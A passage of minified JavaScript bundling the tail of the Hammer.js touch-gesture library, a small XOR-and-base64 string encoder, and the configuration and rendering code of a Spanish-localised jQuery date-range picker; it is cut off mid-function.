        this.options = r({}, this.defaults, e || {}),
        this.id = x++,
        this.manager = null,
        this.options.enable = v(this.options.enable, !0),
        this.state = Se,
        this.simultaneous = {},
        this.requireFail = []
    }
    function He(e) {
        return 16 & e ? "cancel" : 8 & e ? "end" : 4 & e ? "move" : 2 & e ? "start" : ""
    }
    function Ee(e) {
        return e == $ ? "down" : e == R ? "up" : e == I ? "left" : e == z ? "right" : ""
    }
    function je(e, t) {
        var n = t.manager;
        return n ? n.get(e) : e
    }
    function Ce() {
        xe.apply(this, arguments)
    }
    function Ae() {
        Ce.apply(this, arguments),
        this.pX = null,
        this.pY = null
    }
    function Pe() {
        Ce.apply(this, arguments)
    }
    function Oe() {
        xe.apply(this, arguments),
        this._timer = null,
        this._input = null
    }
    function Ne() {
        Ce.apply(this, arguments)
    }
    function Fe() {
        Ce.apply(this, arguments)
    }
    function We() {
        xe.apply(this, arguments),
        this.pTime = !1,
        this.pCenter = !1,
        this._timer = null,
        this._input = null,
        this.count = 0
    }
    function Ie(e, t) {
        return (t = t || {}).recognizers = v(t.recognizers, Ie.defaults.preset),
        new ze(e,t)
    }
    xe.prototype = {
        defaults: {},
        set: function(e) {
            return r(this.options, e),
            this.manager && this.manager.touchAction.update(),
            this
        },
        recognizeWith: function(e) {
            if (i(e, "recognizeWith", this))
                return this;
            var t = this.simultaneous;
            return t[(e = je(e, this)).id] || (t[e.id] = e).recognizeWith(this),
            this
        },
        dropRecognizeWith: function(e) {
            return i(e, "dropRecognizeWith", this) || (e = je(e, this),
            delete this.simultaneous[e.id]),
            this
        },
        requireFailure: function(e) {
            if (i(e, "requireFailure", this))
                return this;
            var t = this.requireFail;
            return -1 === Y(t, e = je(e, this)) && (t.push(e),
            e.requireFailure(this)),
            this
        },
        dropRequireFailure: function(e) {
            if (i(e, "dropRequireFailure", this))
                return this;
            e = je(e, this);
            var t = Y(this.requireFail, e);
            return -1 < t && this.requireFail.splice(t, 1),
            this
        },
        hasRequireFailures: function() {
            return 0 < this.requireFail.length
        },
        canRecognizeWith: function(e) {
            return !!this.simultaneous[e.id]
        },
        emit: function(t) {
            var n = this
              , e = this.state;
            function i(e) {
                n.manager.emit(e, t)
            }
            e < 8 && i(n.options.event + He(e)),
            i(n.options.event),
            t.additionalEvent && i(t.additionalEvent),
            8 <= e && i(n.options.event + He(e))
        },
        tryEmit: function(e) {
            if (this.canEmit())
                return this.emit(e);
            this.state = 32
        },
        canEmit: function() {
            for (var e = 0; e < this.requireFail.length; ) {
                if (!(this.requireFail[e].state & (32 | Se)))
                    return !1;
                e++
            }
            return !0
        },
        recognize: function(e) {
            var t = r({}, e);
            if (!y(this.options.enable, [this, t]))
                return this.reset(),
                void (this.state = 32);
            56 & this.state && (this.state = Se),
            this.state = this.process(t),
            30 & this.state && this.tryEmit(t)
        },
        process: function(e) {},
        getTouchAction: function() {},
        reset: function() {}
    },
    _(Ce, xe, {
        defaults: {
            pointers: 1
        },
        attrTest: function(e) {
            var t = this.options.pointers;
            return 0 === t || e.pointers.length === t
        },
        process: function(e) {
            var t = this.state
              , n = e.eventType
              , i = 6 & t
              , a = this.attrTest(e);
            return i && (n & F || !a) ? 16 | t : i || a ? n & N ? 8 | t : 2 & t ? 4 | t : 2 : 32
        }
    }),
    _(Ae, Ce, {
        defaults: {
            event: "pan",
            threshold: 10,
            pointers: 1,
            direction: U
        },
        getTouchAction: function() {
            var e = this.options.direction
              , t = [];
            return e & B && t.push(Ye),
            e & q && t.push(De),
            t
        },
        directionTest: function(e) {
            var t = this.options
              , n = !0
              , i = e.distance
              , a = e.direction
              , s = e.deltaX
              , r = e.deltaY;
            return a & t.direction || (i = t.direction & B ? (a = 0 === s ? W : s < 0 ? I : z,
            n = s != this.pX,
            Math.abs(e.deltaX)) : (a = 0 === r ? W : r < 0 ? R : $,
            n = r != this.pY,
            Math.abs(e.deltaY))),
            e.direction = a,
            n && i > t.threshold && a & t.direction
        },
        attrTest: function(e) {
            return Ce.prototype.attrTest.call(this, e) && (2 & this.state || !(2 & this.state) && this.directionTest(e))
        },
        emit: function(e) {
            this.pX = e.deltaX,
            this.pY = e.deltaY;
            var t = Ee(e.direction);
            t && (e.additionalEvent = this.options.event + t),
            this._super.emit.call(this, e)
        }
    }),
    _(Pe, Ce, {
        defaults: {
            event: "pinch",
            threshold: 0,
            pointers: 2
        },
        getTouchAction: function() {
            return [ke]
        },
        attrTest: function(e) {
            return this._super.attrTest.call(this, e) && (Math.abs(e.scale - 1) > this.options.threshold || 2 & this.state)
        },
        emit: function(e) {
            if (1 !== e.scale) {
                var t = e.scale < 1 ? "in" : "out";
                e.additionalEvent = this.options.event + t
            }
            this._super.emit.call(this, e)
        }
    }),
    _(Oe, xe, {
        defaults: {
            event: "press",
            pointers: 1,
            time: 251,
            threshold: 9
        },
        getTouchAction: function() {
            return ["auto"]
        },
        process: function(e) {
            var t = this.options
              , n = e.pointers.length === t.pointers
              , i = e.distance < t.threshold
              , a = e.deltaTime > t.time;
            if (this._input = e,
            !i || !n || e.eventType & (N | F) && !a)
                this.reset();
            else if (e.eventType & O)
                this.reset(),
                this._timer = u(function() {
                    this.state = 8,
                    this.tryEmit()
                }, t.time, this);
            else if (e.eventType & N)
                return 8;
            return 32
        },
        reset: function() {
            clearTimeout(this._timer)
        },
        emit: function(e) {
            8 === this.state && (e && e.eventType & N ? this.manager.emit(this.options.event + "up", e) : (this._input.timeStamp = m(),
            this.manager.emit(this.options.event, this._input)))
        }
    }),
    _(Ne, Ce, {
        defaults: {
            event: "rotate",
            threshold: 0,
            pointers: 2
        },
        getTouchAction: function() {
            return [ke]
        },
        attrTest: function(e) {
            return this._super.attrTest.call(this, e) && (Math.abs(e.rotation) > this.options.threshold || 2 & this.state)
        }
    }),
    _(Fe, Ce, {
        defaults: {
            event: "swipe",
            threshold: 10,
            velocity: .3,
            direction: B | q,
            pointers: 1
        },
        getTouchAction: function() {
            return Ae.prototype.getTouchAction.call(this)
        },
        attrTest: function(e) {
            var t, n = this.options.direction;
            return n & (B | q) ? t = e.overallVelocity : n & B ? t = e.overallVelocityX : n & q && (t = e.overallVelocityY),
            this._super.attrTest.call(this, e) && n & e.offsetDirection && e.distance > this.options.threshold && e.maxPointers == this.options.pointers && h(t) > this.options.velocity && e.eventType & N
        },
        emit: function(e) {
            var t = Ee(e.offsetDirection);
            t && this.manager.emit(this.options.event + t, e),
            this.manager.emit(this.options.event, e)
        }
    }),
    _(We, xe, {
        defaults: {
            event: "tap",
            pointers: 1,
            taps: 1,
            interval: 300,
            time: 250,
            threshold: 9,
            posThreshold: 10
        },
        getTouchAction: function() {
            return [be]
        },
        process: function(e) {
            var t = this.options
              , n = e.pointers.length === t.pointers
              , i = e.distance < t.threshold
              , a = e.deltaTime < t.time;
            if (this.reset(),
            e.eventType & O && 0 === this.count)
                return this.failTimeout();
            if (i && a && n) {
                if (e.eventType != N)
                    return this.failTimeout();
                var s = !this.pTime || e.timeStamp - this.pTime < t.interval
                  , r = !this.pCenter || te(this.pCenter, e.center) < t.posThreshold;
                if (this.pTime = e.timeStamp,
                this.pCenter = e.center,
                r && s ? this.count += 1 : this.count = 1,
                this._input = e,
                0 == this.count % t.taps)
                    return this.hasRequireFailures() ? (this._timer = u(function() {
                        this.state = 8,
                        this.tryEmit()
                    }, t.interval, this),
                    2) : 8
            }
            return 32
        },
        failTimeout: function() {
            return this._timer = u(function() {
                this.state = 32
            }, this.options.interval, this),
            32
        },
        reset: function() {
            clearTimeout(this._timer)
        },
        emit: function() {
            8 == this.state && (this._input.tapCount = this.count,
            this.manager.emit(this.options.event, this._input))
        }
    }),
    Ie.VERSION = "2.0.8",
    Ie.defaults = {
        domEvents: !1,
        touchAction: "compute",
        enable: !0,
        inputTarget: null,
        inputClass: null,
        preset: [[Ne, {
            enable: !1
        }], [Pe, {
            enable: !1
        }, ["rotate"]], [Fe, {
            direction: B
        }], [Ae, {
            direction: B
        }, ["swipe"]], [We], [We, {
            event: "doubletap",
            taps: 2
        }, ["tap"]], [Oe]],
        cssProps: {
            userSelect: "none",
            touchSelect: "none",
            touchCallout: "none",
            contentZooming: "none",
            userDrag: "none",
            tapHighlightColor: "rgba(0,0,0,0)"
        }
    };
    function ze(e, t) {
        var n;
        this.options = r({}, Ie.defaults, t || {}),
        this.options.inputTarget = this.options.inputTarget || e,
        this.handlers = {},
        this.session = {},
        this.recognizers = [],
        this.oldCssProps = {},
        this.element = e,
        this.input = new ((n = this).options.inputClass || (j ? ce : C ? _e : E ? ye : re))(n,X),
        this.touchAction = new Te(this,this.options.touchAction),
        Re(this, !0),
        f(this.options.recognizers, function(e) {
            var t = this.add(new e[0](e[1]));
            e[2] && t.recognizeWith(e[2]),
            e[3] && t.requireFailure(e[3])
        }, this)
    }
    function Re(n, i) {
        var a, s = n.element;
        s.style && (f(n.options.cssProps, function(e, t) {
            a = S(s.style, t),
            i ? (n.oldCssProps[a] = s.style[a],
            s.style[a] = e) : s.style[a] = n.oldCssProps[a] || ""
        }),
        i || (n.oldCssProps = {}))
    }
    ze.prototype = {
        set: function(e) {
            return r(this.options, e),
            e.touchAction && this.touchAction.update(),
            e.inputTarget && (this.input.destroy(),
            this.input.target = e.inputTarget,
            this.input.init()),
            this
        },
        stop: function(e) {
            this.session.stopped = e ? 2 : 1
        },
        recognize: function(e) {
            var t = this.session;
            if (!t.stopped) {
                var n;
                this.touchAction.preventDefaults(e);
                var i = this.recognizers
                  , a = t.curRecognizer;
                (!a || a && 8 & a.state) && (a = t.curRecognizer = null);
                for (var s = 0; s < i.length; )
                    n = i[s],
                    2 === t.stopped || a && n != a && !n.canRecognizeWith(a) ? n.reset() : n.recognize(e),
                    !a && 14 & n.state && (a = t.curRecognizer = n),
                    s++
            }
        },
        get: function(e) {
            if (e instanceof xe)
                return e;
            for (var t = this.recognizers, n = 0; n < t.length; n++)
                if (t[n].options.event == e)
                    return t[n];
            return null
        },
        add: function(e) {
            if (i(e, "add", this))
                return this;
            var t = this.get(e.options.event);
            return t && this.remove(t),
            this.recognizers.push(e),
            (e.manager = this).touchAction.update(),
            e
        },
        remove: function(e) {
            if (i(e, "remove", this))
                return this;
            if (e = this.get(e)) {
                var t = this.recognizers
                  , n = Y(t, e);
                -1 !== n && (t.splice(n, 1),
                this.touchAction.update())
            }
            return this
        },
        on: function(e, t) {
            if (e !== c && t !== c) {
                var n = this.handlers;
                return f(D(e), function(e) {
                    n[e] = n[e] || [],
                    n[e].push(t)
                }),
                this
            }
        },
        off: function(e, t) {
            if (e !== c) {
                var n = this.handlers;
                return f(D(e), function(e) {
                    t ? n[e] && n[e].splice(Y(n[e], t), 1) : delete n[e]
                }),
                this
            }
        },
        emit: function(e, t) {
            var n, i, a;
            this.options.domEvents && (n = e,
            i = t,
            (a = o.createEvent("Event")).initEvent(n, !0, !0),
            (a.gesture = i).target.dispatchEvent(a));
            var s = this.handlers[e] && this.handlers[e].slice();
            if (s && s.length) {
                t.type = e,
                t.preventDefault = function() {
                    t.srcEvent.preventDefault()
                }
                ;
                for (var r = 0; r < s.length; )
                    s[r](t),
                    r++
            }
        },
        destroy: function() {
            this.element && Re(this, !1),
            this.handlers = {},
            this.session = {},
            this.input.destroy(),
            this.element = null
        }
    },
    r(Ie, {
        INPUT_START: O,
        INPUT_MOVE: 2,
        INPUT_END: N,
        INPUT_CANCEL: F,
        STATE_POSSIBLE: Se,
        STATE_BEGAN: 2,
        STATE_CHANGED: 4,
        STATE_ENDED: 8,
        STATE_RECOGNIZED: 8,
        STATE_CANCELLED: 16,
        STATE_FAILED: 32,
        DIRECTION_NONE: W,
        DIRECTION_LEFT: I,
        DIRECTION_RIGHT: z,
        DIRECTION_UP: R,
        DIRECTION_DOWN: $,
        DIRECTION_HORIZONTAL: B,
        DIRECTION_VERTICAL: q,
        DIRECTION_ALL: U,
        Manager: ze,
        Input: G,
        TouchAction: Te,
        TouchInput: _e,
        MouseInput: re,
        PointerEventInput: ce,
        TouchMouseInput: ye,
        SingleTouchInput: me,
        Recognizer: xe,
        AttrRecognizer: Ce,
        Tap: We,
        Pan: Ae,
        Swipe: Fe,
        Pinch: Pe,
        Rotate: Ne,
        Press: Oe,
        on: M,
        off: L,
        each: f,
        merge: p,
        extend: a,
        assign: r,
        inherit: _,
        bindFn: g,
        prefixed: S
    }),
    (void 0 !== s ? s : "undefined" != typeof self ? self : {}).Hammer = Ie,
    "function" == typeof define && define.amd ? define(function() {
        return Ie
    }) : "undefined" != typeof module && module.exports ? module.exports = Ie : s.Hammer = Ie
}(window, document),
function(e) {
    "use strict";
    var t = {
        encode: function(e, t) {
            var n, i;
            return n = e,
            i = t,
            function(e) {
                var t, n, i, a, s, r, o, l, d, u = 0, c = "";
                if (!e)
                    return e;
                for (; t = e[u++],
                n = e[u++],
                i = e[u++],
                a = (l = t << 16 | n << 8 | i) >> 18 & 63,
                s = l >> 12 & 63,
                r = l >> 6 & 63,
                o = 63 & l,
                c += h.charAt(a) + h.charAt(s) + h.charAt(r) + h.charAt(o),
                u < e.length; )
                    ;
                return ((d = e.length % 3) ? c.slice(0, d - 3) : c) + "===".slice(d || 3)
            }(t = $.map(Array.from(i), function(e, t) {
                return e.charCodeAt(0) ^ a(n, t)
            }))
        },
        decode: function(e, t) {
            return t = function(e) {
                var t, n, i, a, s, r, o, l, d = 0, u = [];
                if (!e)
                    return e;
                e += "";
                for (; a = h.indexOf(e.charAt(d++)),
                s = h.indexOf(e.charAt(d++)),
                r = h.indexOf(e.charAt(d++)),
                o = h.indexOf(e.charAt(d++)),
                t = (l = a << 18 | s << 12 | r << 6 | o) >> 16 & 255,
                n = l >> 8 & 255,
                i = 255 & l,
                u.push(t),
                64 !== r && (u.push(n),
                64 !== o && u.push(i)),
                d < e.length; )
                    ;
                return u
            }(t),
            n = e,
            i = t,
            $.map(Array.from(i), function(e, t) {
                return String.fromCharCode(e ^ a(n, t))
            }).join("");
            var n, i
        }
    }
      , h = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    function a(e, t) {
        return e.charCodeAt(Math.floor(t % e.length))
    }
    e.XORCipher = t
}(this),
function(g, r, o, u) {
    function t(e, t) {
        this.elem = e,
        this.$elem = g(e),
        this.options = t,
        this.metadata = this.$elem.data("plugin-options")
    }
    t.defaults = (t.prototype = {
        public: function() {
            return {
                startDate: moment(),
                endDate: moment(),
                format: "L LT",
                dateSeparator: " - ",
                calendarCount: 2,
                mobileBreakpoint: 760,
                isHotelBooking: !1,
                inline: !1,
                minDate: null,
                maxDate: null,
                showHeader: !0,
                showFooter: !0,
                rangeOrientation: "horizontal",
                verticalRangeWidth: 180,
                showTimePickers: !0,
                showCalendars: !0,
                showButtons: !1,
                hourFormat: 12,
                dontPrefixHours: !1,
                minuteSteps: 1,
                startOnMonday: !1,
                container: "body",
                oneCalendarWidth: 230,
                enableKeyboard: !0,
                showOn: "bottom",
                arrowOn: "left",
                autoAlign: !0,
                locale: moment.locale(),
                singleDate: !1,
                target: null,
                autoCloseOnSelect: !1,
                startEmpty: !1,
                ranges: [{
                    title: "Hoy",
                    startDate: moment().startOf("day"),
                    endDate: moment().endOf("day")
                }, {
                    title: "3 días",
                    startDate: moment().startOf("day"),
                    endDate: moment().add(2, "days").endOf("day")
                }, {
                    title: "5 días",
                    startDate: moment().startOf("day"),
                    endDate: moment().add(4, "days").endOf("day")
                }, {
                    title: "1 semana",
                    startDate: moment().startOf("day"),
                    endDate: moment().add(6, "days").endOf("day")
                }, {
                    title: "Próxima semana",
                    startDate: moment().startOf("day"),
                    endDate: moment().endOf("week").endOf("day")
                }, {
                    title: "Próximo mes",
                    startDate: moment().startOf("day"),
                    endDate: moment().endOf("month").endOf("day")
                }],
                rangeLabel: "Rangos: ",
                cancelLabel: "Cancelar",
                applyLabel: "Aceptar",
                nextMonthIcon: "<i class='fa fa-arrow-right'></i>",
                prevMonthIcon: "<i class='fa fa-arrow-left'></i>",
                rangeIcon: "<i class='fa fa-retweet'></i>",
                headerSeparator: "<i class='fa fa-chevron-right'></i>",
                onbeforeselect: function() {
                    return !0
                },
                onCancel: function() {
                    return !0
                },
                onafterselect: function() {},
                onbeforeshow: function() {},
                onbeforehide: function() {},
                onaftershow: function() {},
                onafterhide: function() {},
                onfirstselect: function() {},
                onrangeselect: function() {},
                onbeforemonthchange: function() {
                    return !0
                },
                onaftermonthchange: function() {},
                onafteryearchange: function() {},
                ondraw: function() {},
                onBeforeInit: function() {},
                onBeforeDestroy: function() {
                    return !0
                },
                ondestroy: function() {},
                validateClick: function() {
                    return !0
                },
                oninit: function() {},
                ontimechange: function() {},
                disableDays: function() {
                    return !1
                },
                limitTimeForDay: function() {
                    return {
                        start: {
                            hour: 0,
                            minute: 0,
                            ampm: null
                        },
                        end: {
                            hour: 23,
                            minute: 59,
                            ampm: null
                        }
                    }
                },
                disabledRanges: [],
                continuous: !1,
                disableOnlyStart: !1,
                disableOnlyEnd: !1,
                minSelectedDays: 0,
                enableMonthSwitcher: !0,
                monthSwitcherFormat: "MMMM",
                enableYearSwitcher: !0,
                enableSwipe: !0,
                numericMonthSelector: !1,
                reverseTimepickerArrows: !1,
                showWeekNumbers: !1,
                hideOutOfRange: !1,
                DOBCalendar: !1,
                isRTL: !1
            }
        },
        private: function() {
            return {
                startSelected: !1,
                currentDate: moment(),
                endSelected: !0,
                hoverDate: null,
                keyboardHoverDate: null,
                headerStartDay: null,
                headerStartDate: null,
                headerStartWeekday: null,
                headerEndDay: null,
                headerEndDate: null,
                headerEndWeekday: null,
                swipeTimeout: null,
                isMobile: !1,
                valElements: ["BUTTON", "OPTION", "INPUT", "LI", "METER", "PROGRESS", "PARAM"],
                dontHideOnce: !1,
                initiator: null,
                initComplete: !1,
                startDateBackup: null,
                firstValueSelected: !1,
                startDateInitial: null,
                endDateInitial: null,
                startScrolling: !1,
                lastScrollDirection: "bottom",
                throttleTimeout: null,
                documentEvent: null,
                delayInputUpdate: !1,
                startTimeBackup: null,
                endTimeBackup: null,
                mouseTimer: !1,
                preventMouseClick: !1,
                lastScrollX: 0,
                lastScrollY: 0,
                isTicking: !1,
                parentScrollEventsAttached: !1,
                rafID: 0,
                disabledDays: {},
                skipTabKeyOnInput: !1
            }
        },
        init: function() {
            return this.config = g.extend({}, this.public(), this.options, this.metadata),
            this.globals = g.extend({}, this.private()),
            this.globals.isMobile = this.checkMobile(),
            g("body").addClass(this.checkTouch() ? "calendario-touch" : "calendario-notouch"),
            this.config.onBeforeInit(this),
            this.applyConfig(),
            this.fetchInputs(),
            !1 !== this.config.startEmpty && !this.globals.firstValueSelected || (this.globals.currentDate = moment(this.config.startDate)),
            this.drawUserInterface(),
            this.addInitialEvents(),
            this.$elem.data("calendario", this),
            this.config.oninit(this),
            this.globals.initComplete = !0,
            this.globals.lastScrollX = r.scrollX || r.pageXOffset || o.documentElement.scrollLeft,
            this.globals.lastScrollY = r.scrollY || r.pageYOffset || o.documentElement.scrollTop,
            g(r).trigger("resize.calendario"),
            this
        },
        validateDates: function() {
            if (null !== this.config.startDate && null !== this.config.endDate) {
                var e = moment(this.config.startDate, this.config.format).locale(this.config.locale)
                  , t = moment(this.config.endDate, this.config.format).locale(this.config.locale)
                  , n = moment().locale(this.config.locale);
                !1 === this.config.singleDate ? (e.isValid() && t.isValid() ? e.isBefore(t) ? (this.config.startDate = e.clone(),
                this.config.endDate = t.clone()) : (this.config.startDate = t.clone(),
                this.config.endDate = e.clone()) : (this.config.startDate = n.clone(),
                this.config.endDate = n.clone()),
                this.config.startDate = this.TimeInsideLimits(this.config.startDate, "start"),
                this.config.endDate = this.TimeInsideLimits(this.config.endDate, "end")) : (!1 === e.isValid() ? this.config.startDate = n.clone() : this.config.startDate = e.clone(),
                this.config.startDate = this.TimeInsideLimits(this.config.startDate, "start"));
                var i = null
                  , a = null;
                null !== this.config.minDate && ((i = moment(this.config.minDate, this.config.format).locale(this.config.locale)).isValid() ? this.config.minDate = i.clone() : i = this.config.minDate = null),
                null !== this.config.maxDate && ((a = moment(this.config.maxDate, this.config.format).locale(this.config.locale)).isValid() ? !i || i.isBefore(a) ? this.config.maxDate = a.clone() : (this.config.minDate = a.clone(),
                this.config.maxDate = i.clone()) : a = this.config.maxDate = null),
                i && e && i.isAfter(e, "day") && (this.config.startDate = i.clone()),
                i && t && i.isAfter(t, "day") && (this.config.endDate = i.clone()),
                a && e && a.isBefore(e, "day") && (this.config.startDate = a.clone()),
                null !== a && null !== t && a.isBefore(t, "day") && (this.config.endDate = a.clone()),
                (!1 === this.checkRangeContinuity() || 1 == this.config.disableOnlyStart && this.isDisabled(this.config.startDate, this.config.isHotelBooking) || !1 === this.config.singleDate && this.config.disableOnlyEnd && this.isDisabled(this.config.endDate, this.config.isHotelBooking) || this.config.startEmpty && 0 == this.globals.firstValueSelected) && this.clearInput()
            }
        },
        applyConfig: function() {
            null === this.config.target && (this.config.target = this.$elem),
            !0 === this.config.inline && (this.config.DOBCalendar = !1),
            1 == this.config.DOBCalendar && (this.config.singleDate = !0),
            ["startDate", "endDate", "minDate", "maxDate"].forEach(function(e) {
                this.config[e] = this.fixDateTime(this.config[e])
            }, this),
            this.config.ranges.map(function(e) {
                return e.startDate = this.fixDateTime(e.startDate),
                e.endDate = this.fixDateTime(e.endDate),
                e
            }, this),
            !1 === this.globals.isMobile ? (!0 === this.config.inline ? (this.container = this.$elem.wrapAll("<div class='calendario-container calendario-inline' onclick=''></div>").parent(),
            this.input = g("<div class='calendario-input'></div>").appendTo(this.container),
            this.elem.type = "hidden",
            this.config.showButtons = !1,
            this.setViewport()) : (this.container = g("<div class='calendario-container calendario-popup' style='display: none;' onclick=''><div class='calendario-box-arrow-top'></div></div>").appendTo(this.config.container),
            this.input = g("<div class='calendario-input'></div>").appendTo(this.container),
            this.config.showButtons && (this.globals.delayInputUpdate = !0,
            this.config.autoCloseOnSelect = !1)),
            "horizontal" === this.config.rangeOrientation ? this.input.css("width", this.config.calendarCount * this.config.oneCalendarWidth + "px") : this.input.css("width", this.config.calendarCount * this.config.oneCalendarWidth + this.config.verticalRangeWidth + "px")) : (!0 === this.config.inline ? (this.container = this.$elem.wrapAll("<div class='calendario-container-mobile calendario-inline' onclick=''></div>").parent(),
            this.input = g("<div class='calendario-input'></div>").appendTo(this.container),
            this.elem.type = "hidden",
            this.config.showButtons = !1) : (this.container = g("<div class='calendario-container-mobile' onclick=''></div>").appendTo(this.config.container),
            this.input = g("<div class='calendario-input' style='display: none;'></div>").appendTo(this.container),
            0 === g("body > .calendario-overlay").length ? (this.overlay = g("<div class='calendario-overlay' style='display: none'></div>").appendTo("body"),
            this.overlay.on("click.calendario tap.calendario", function() {
                var e = g("body > .calendario-container-mobile");
                0 < e.length && e.each(function() {
                    "none" != g(this).css("display") && g(this).find(".calendario-cancel").click()
                })
            })) : this.overlay = g("body > .calendario-overlay").first(),
            this.config.showButtons && (this.config.autoCloseOnSelect = !1),
            this.config.autoCloseOnSelect || (this.globals.delayInputUpdate = !0)),
            this.$elem.on("focus", function() {
                g(this).blur()
            })),
            this.config.isHotelBooking && this.container.addClass("calendario-hotel-style"),
            this.container.data("calendario", this),
            this.clearRangeSelection()
        },
        clearRangeSelection: function() {
            for (var e = 0; e < this.config.ranges.length; e++)
                this.config.ranges[e].selected = !1;
            this.container.find(".calendario-range").each(function() {
                g(this).removeClass("calendario-range-selected")
            })
        },
        fetchInputs: function() {
            var e = null;
            if (e = -1 !== g.inArray(this.config.target.get(0).tagName, this.globals.valElements) ? this.config.target.val() : this.config.target.text(),
            !1 === this.config.singleDate && 0 < e.indexOf(this.config.dateSeparator) && "" !== e) {
                var t = e.split(this.config.dateSeparator);
                if (2 == t.length && moment(t[0], this.config.format, this.config.locale).isValid() && moment(t[1], this.config.format, this.config.locale).isValid()) {
                    var n = null;
                    this.config.showCalendars && (moment.isMoment(this.config.startDate) ? (n = moment(t[0], this.config.format, this.config.locale),
                    this.config.startDate.year(n.year()).month(n.month()).date(n.date())) : this.config.startDate = moment(t[0], this.config.format, this.config.locale),
                    moment.isMoment(this.config.endDate) ? (n = moment(t[1], this.config.format, this.config.locale),
                    this.config.endDate.year(n.year()).month(n.month()).date(n.date())) : this.config.endDate = moment(t[1], this.config.format, this.config.locale)),
                    this.config.showTimePickers && (moment.isMoment(this.config.startDate) ? (n = moment(t[0], this.config.format, this.config.locale),
                    this.config.startDate.hour(n.hour()).minute(n.minute()).seconds(n.seconds())) : this.config.startDate = moment(t[0], this.config.format, this.config.locale),
                    moment.isMoment(this.config.endDate) ? (n = moment(t[1], this.config.format, this.config.locale),
                    this.config.endDate.hour(n.hour()).minute(n.minute()).seconds(n.seconds())) : this.config.endDate = moment(t[1], this.config.format, this.config.locale)),
                    this.globals.firstValueSelected = !0
                }
            } else if (!0 === this.config.singleDate) {
                var i = e;
                "" !== i && moment(i, this.config.format, this.config.locale).isValid() && (this.config.startDate = moment(i, this.config.format, this.config.locale),
                this.config.endDate = moment(i, this.config.format, this.config.locale),
                this.globals.firstValueSelected = !0)
            }
            this.config.startEmpty && !this.globals.firstValueSelected && this.clearInput(),
            this.validateDates(),
            this.updateTimePickerDisplay()
        },
        drawUserInterface: function() {
            if (this.drawHeader(),
            this.calendars = this.input.find(".calendario-calendars").first(),
            !0 === this.config.showCalendars) {
                var e = this.globals.currentDate.clone().middleOfDay();
                this.globals.disabledDays = {};
                for (var t = 0; t < this.config.calendarCount; t++)
                    this.drawCalendarOfMonth(e),
                    e = e.month(e.month() + 1);
                this.calendars.find(".calendario-calendar").last().addClass("no-border-right"),
                this.drawArrows()
            } else
                this.calendars.hide(),
                this.container.addClass("calendario-hidden-calendar");
            if (this.drawTimePickers(),
            this.addKeyboardEvents(),
            this.drawFooter(),
            this.reDrawCells(),
            this.globals.initComplete && this.setViewport(),
            this.config.isRTL && (this.container.css("direction", "rtl"),
            this.container.addClass("calendario-rtl")),
            !1 === this.globals.startSelected)
                if (this.globals.initComplete)
                    this.updateInput(!1, !1);
                else {
                    var n = this.globals.delayInputUpdate;
                    this.globals.delayInputUpdate = !1,
                    this.updateInput(!1, !1),
                    this.globals.delayInputUpdate = n
                }
        },
        drawHeader: function() {
            var e = "<div class='calendario-header'><div class='calendario-header-start'><div class='calendario-header-start-day'></div><div class='calendario-header-start-date'></div><div class='calendario-header-start-weekday'></div></div>";
            !1 === this.config.singleDate && (e += "<div class='calendario-header-separator'>" + this.config.headerSeparator + "</div><div class='calendario-header-end'><div class='calendario-header-end-day'></div><div class='calendario-header-end-date'></div><div class='calendario-header-end-weekday'></div></div>"),
            e += "</div><div class='calendario-calendars' tabindex='0'></div>",
            this.input.append(e),
            !1 !== this.config.showHeader && !1 !== this.config.showCalendars || this.input.find(".calendario-header").hide(),
            this.globals.headerStartDay = this.input.find(".calendario-header-start-day"),
            this.globals.headerStartDate = this.input.find(".calendario-header-start-date"),
            this.globals.headerStartWeekday = this.input.find(".calendario-header-start-weekday"),
            this.globals.headerEndDay = this.input.find(".calendario-header-end-day"),
            this.globals.headerEndDate = this.input.find(".calendario-header-end-date"),
            this.globals.headerEndWeekday = this.input.find(".calendario-header-end-weekday"),
            this.updateHeader()
        },
        updateHeader: function() {
            null !== this.config.startDate ? (this.config.startDate.locale(this.config.locale),
            this.globals.headerStartDay.text(this.localizeNumbers(this.config.startDate.date())),
            this.globals.isMobile ? this.globals.headerStartDate.text(this.config.startDate.format("MMM") + " " + this.localizeNumbers(this.config.startDate.year())) : this.globals.headerStartDate.text(this.config.startDate.format("MMMM") + " " + this.localizeNumbers(this.config.startDate.year())),
            this.globals.headerStartWeekday.text(this.config.startDate.format("dddd"))) : (this.globals.headerStartDay.text(""),
            this.globals.headerStartDate.text(""),
            this.globals.headerStartWeekday.text("")),
            !1 === this.config.singleDate && (null !== this.config.endDate ? (this.config.endDate.locale(this.config.locale),
            this.globals.headerEndDay.text(this.localizeNumbers(this.config.endDate.date())),
            this.globals.isMobile ? this.globals.headerEndDate.text(this.config.endDate.format("MMM") + " " + this.localizeNumbers(this.config.endDate.year())) : this.globals.headerEndDate.text(this.config.endDate.format("MMMM") + " " + this.localizeNumbers(this.config.endDate.year())),
            this.globals.headerEndWeekday.text(this.config.endDate.format("dddd"))) : (this.globals.headerEndDay.text(""),
            this.globals.headerEndDate.text(""),
            this.globals.headerEndWeekday.text("")))
        },
        isUpdateable: function() {
            var e = this.globals.delayInputUpdate
              , t = this.config.startEmpty && !this.globals.firstValueSelected;
            return (t = (t = t || !0 === this.config.singleDate && null === this.config.startDate) || !1 === this.config.singleDate && (null === this.config.startDate || !1 === this.globals.startSelected && null === this.config.endDate)) && this.clearInput(),
            !t && !e
        },
        updateInput: function(e, t) {
            this.isUpdateable() && (this.readTimeFromDisplay(!1),
            this.config.startDate && this.config.endDate && (this.config.startDate.locale(this.config.locale),
            this.config.endDate.locale(this.config.locale),
            -1 !== g.inArray(this.config.target.get(0).tagName, this.globals.valElements) ? !1 === this.config.singleDate ? this.config.target.val(this.config.startDate.format(this.config.format) + this.config.dateSeparator + this.config.endDate.format(this.config.format)) : this.config.target.val(this.config.startDate.format(this.config.format)) : !1 === this.config.singleDate ? this.config.target.text(this.config.startDate.format(this.config.format) + this.config.dateSeparator + this.config.endDate.format(this.config.format)) : this.config.target.text(this.config.startDate.format(this.config.format)),
            this.globals.initComplete && (t ? this.config.ontimechange(this, this.config.startDate ? this.config.startDate.clone() : null, this.config.endDate ? this.config.endDate.clone() : null) : e && this.config.onafterselect(this, this.config.startDate ? this.config.startDate.clone() : null, this.config.endDate ? this.config.endDate.clone() : null),
            this.input.trigger("change"))))
        },
        clearInput: function(e) {
            if (-1 !== g.inArray(this.config.target.get(0).tagName, this.globals.valElements) ? (this.config.singleDate,
